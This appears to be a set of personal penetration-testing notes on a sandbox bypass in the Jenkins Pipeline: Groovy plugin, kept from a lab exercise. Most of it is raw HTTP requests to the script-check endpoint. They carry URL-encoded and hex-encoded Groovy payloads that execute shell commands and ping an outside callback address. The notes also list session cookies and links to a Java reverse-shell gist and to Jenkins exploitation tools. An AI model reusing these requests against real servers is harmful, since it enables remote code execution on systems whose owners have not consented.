https://github.com/advisories/GHSA-r6mc-mrvr-23cr

### Description: Sandbox bypass in Jenkins Pipeline: Groovy Plugin
```
A sandbox bypass vulnerability exists in Jenkins Pipeline: Groovy Plugin 2.63 and earlier in pom.xml, src/main/java/org/jenkinsci/plugins/workflow/cps/CpsGroovyShell.java that allows attackers able to control pipeline scripts to execute arbitrary code on the Jenkins master JVM.
```

#1st
```
GET /jenkinselj/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public%20class%20x%20%7B%0A%20%20public%20x()%7B%0A%22ping%20-c%201%2010.10.14.39%22.execute()%0A%7D%0A%7D HTTP/1.1
Host: 10.10.110.102:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
Sec-Purpose: prefetch;prerender
Purpose: prefetch
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID.6d0ae5fa=node010s70njk6y02l1sosz3qzd1j8n1846.node0
Connection: close


```
#2nd 
```
GET /jenkinselj/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public%20class%20x%20%7B%0A%20%20public%20x()%7B%0A%22ping%20-c%201%2010.10.14.39%22.execute()%0A%7D%0A%7D HTTP/1.1
Host: 10.10.110.102:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
Sec-Purpose: prefetch;prerender
Purpose: prefetch
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID.6d0ae5fa=node010s70njk6y02l1sosz3qzd1j8n1846.node0
Connection: close
Upgrade-Insecure-Requests: 1


```

#3rd directly taken from:
https://www.nmmapper.com/st/exploitdetails/48904/43149/jenkins-263-sandbox-bypass-in-pipeline-groovy-plug-in/
```
GET /jenkinselj/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public%20class%20x%20%7B%0A%20%20public%20x()%7B%0A%22ping%20-c%201%2010.10.14.39%22.execute()%0A%7D%0A%7D 
}
} HTTP/1.1
Host: 10.10.110.102:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID.4495c8e0=node01jguwrtw481dx1bf3gaoq5o6no32.node0
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 333

URL Encoding the following for RCE


```public class x {
  public x(){
"ping -c 1 xx.xx.xx.xx".execute()
}

} ```



to



%70%75%62%6c%69%63%20%63%6c%61%73%73%20%78%20%7b%0a%20%20%70%75%62%6c%69%63%20%78%28%29%7b%0a%22%70%69%6e%67%20%2d%63%20%31%20%78%78%2e%78%78%2e%78%78%2e%78%78%22%2e%65%78%65%63%75%74%65%28%29%0a%7d%0a%7d
```
![[Pasted image 20240429121444.png]]
# tried with new cookie

```bash
GET /jenkinselj/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public%20class%20x%20%7B%0A%20%20public%20x()%7B%0A%22ping%20-c%201%2010.10.14.39%22.execute()%0A%7D%0A%7D 
}
} HTTP/1.1
Host: 10.10.110.102:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID.6d0ae5fa=node010s70njk6y02l1sosz3qzd1j8n1846.node0
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 0
```
![[Pasted image 20240429121713.png]]



JAVA rev shell

```bash
https://gist.github.com/caseydunham/53eb8503efad39b83633961f12441af0
```


Crumb issue

```bash
https://stackoverflow.com/questions/16738441/how-to-request-for-the-crumb-issuer-for-jenkins
https://stackoverflow.com/questions/44711696/jenkins-403-no-valid-crumb-was-included-in-the-request
https://stackoverflow.com/questions/56179580/jenkins-groovy-pipeline-org-jenkinsci-plugins-scriptsecurity-sandbox-rejectedacc
```

pwn_Jenkins

```bash
https://github.com/gquere/pwn_jenkins
```

exploit

```bash
https://www.nmmapper.com/st/exploitdetails/48904/43149/jenkins-263-sandbox-bypass-in-pipeline-groovy-plug-in/
https://github.com/daffainfo/AllAboutBugBounty/blob/master/Technologies/Jenkins.md
```